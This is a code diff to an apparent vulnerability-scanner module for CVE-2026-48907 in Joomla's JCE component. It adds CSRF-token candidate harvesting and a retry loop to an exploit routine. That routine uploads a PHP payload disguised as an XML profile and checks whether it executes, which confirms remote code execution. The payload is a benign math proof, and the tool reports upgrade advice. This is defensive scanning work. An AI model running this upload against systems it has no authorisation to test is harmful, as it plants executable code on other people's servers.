@@ -7,7 +7,7 @@ from ...core.http import HttpSession, normalize_url, poll_paths
 from ...core.models import Finding
 
 CVECheckResult = Finding
-from ...core.probes import CSRF_CANDIDATE_PATHS, extract_csrf_from_html, rand_str
+from ...core.probes import CSRF_CANDIDATE_PATHS, extract_csrf_candidates_from_html, rand_str
 from ...core.versions import version_lt
 
 CVE_ID = "CVE-2026-48907"
@@ -120,16 +120,33 @@ def passive_check(target_url: str, joomla_version: str | None, timeout: int = 12
 
 
 def _extract_csrf(sess: HttpSession) -> tuple[str | None, str | None, list[str]]:
+    candidates, checked = _extract_csrf_candidates(sess)
+    if candidates:
+        token, source = candidates[0]
+        return token, source, checked
+    return None, None, checked
+
+
+def _extract_csrf_candidates(sess: HttpSession) -> tuple[list[tuple[str, str]], list[str]]:
     checked = []
+    candidates: list[tuple[str, str]] = []
     for path in CSRF_CANDIDATE_PATHS:
         resp = sess.get(path)
         checked.append(f"{path}:{resp.get('status') if resp else 0}")
         if not resp or resp.get("status") not in (200, 301, 302, 303):
             continue
-        token = extract_csrf_from_html(resp.get("body", ""))
-        if token:
-            return token, path, checked
-    return None, None, checked
+        for token in extract_csrf_candidates_from_html(resp.get("body", "")):
+            if not any(existing == token for existing, _ in candidates):
+                candidates.append((token, path))
+    return candidates, checked
+
+
+def _handler_specific_response(body: str) -> bool:
+    return bool(
+        re.search(r'"success"\s*:\s*true', body, re.IGNORECASE)
+        or re.search(r"\b\d+\s+profile\(s\)\s+imported\s+successfully", body, re.IGNORECASE)
+        or re.search(r"jce|profile.{0,40}(import|upload)|import.{0,40}(success|complete)", body, re.IGNORECASE)
+    )
 
 
 def run_exploit(
@@ -146,8 +163,8 @@ def run_exploit(
         passive.detail += " Exploit verification skipped because passive validation did not indicate a vulnerable JCE version."
         return passive
 
-    token, token_source, checked_token_paths = _extract_csrf(sess)
-    if not token:
+    token_candidates, checked_token_paths = _extract_csrf_candidates(sess)
+    if not token_candidates:
         passive.detail += (
             " Exploit verification was requested but skipped because no Joomla CSRF token was found "
             "in homepage, common form pages, or administrator login. "
@@ -158,16 +175,25 @@ def run_exploit(
     payload, expected = generate_php_math_payload()
     filename = f"jvh-{rand_str(6)}.xml.php"
 
-    upload = sess.post(
-        "/index.php?option=com_jce",
-        fields={"task": "profiles.import", token: "1"},
-        files={"profile_file": (filename, payload.encode("utf-8"), "application/xml")},
-    )
+    upload = None
+    token_source = None
+    rejected_sources = []
+    for token, source in token_candidates:
+        candidate_upload = sess.post(
+            "/index.php?option=com_jce",
+            fields={"task": "profiles.import", token: "1"},
+            files={"profile_file": (filename, payload.encode("utf-8"), "application/xml")},
+        )
+        candidate_body = candidate_upload.get("body", "") if candidate_upload else ""
+        if _invalid_token_response(candidate_body):
+            rejected_sources.append(source)
+            continue
+        upload = candidate_upload
+        token_source = source
+        break
     passive.exploit_ran = True
     upload_body = upload.get("body", "") if upload else ""
-    handler_specific = bool(
-        re.search(r"jce|profile.{0,40}(import|upload)|import.{0,40}(success|complete)", upload_body, re.IGNORECASE)
-    )
+    handler_specific = _handler_specific_response(upload_body)
     if (
         not upload
         or upload.get("status") != 200
@@ -186,11 +212,12 @@ def run_exploit(
             )
             + "No write is claimed and no cleanup filename "
             f"is reported. CSRF token source: {token_source}; upload status: "
-            f"{upload.get('status') if upload else 0}; redirected={upload.get('redirected') if upload else False}."
+            f"{upload.get('status') if upload else 0}; redirected={upload.get('redirected') if upload else False}; "
+            f"rejected token sources: {', '.join(rejected_sources) or 'none'}."
         )
         passive.evidence = {
             "component_present": True,
-            "token_accepted": not _invalid_token_response(upload_body),
+            "token_accepted": bool(upload) and not _invalid_token_response(upload_body),
             "handler_reached": handler_specific,
             "write_reported": False,
             "readback_verified": False,
@@ -204,6 +231,7 @@ def run_exploit(
         candidate_paths,
         deadline=3.0,
         initial_delay=0.1,
+        accept_fn=lambda candidate: any(verify_php_execution(candidate.get("body", ""), expected)),
     )
     if resp and resp.get("status") == 200 and found_path:
         proof_url = f"{base_root}{found_path}"
@@ -225,7 +253,7 @@ def run_exploit(
                 detail=f"RCE confirmed with dynamic runtime math proof ({expected}) after {attempts} attempt(s). Uploaded proof file must be deleted.",
                 action=f"Upgrade JCE to {PATCHED_VERSION} or later and delete {filename}.",
             )
-        if is_source or body:
+        if is_source:
             passive.status = "VULNERABLE_UPLOAD_ONLY"
             passive.confidence = "HIGH"
             passive.proof_url = proof_url
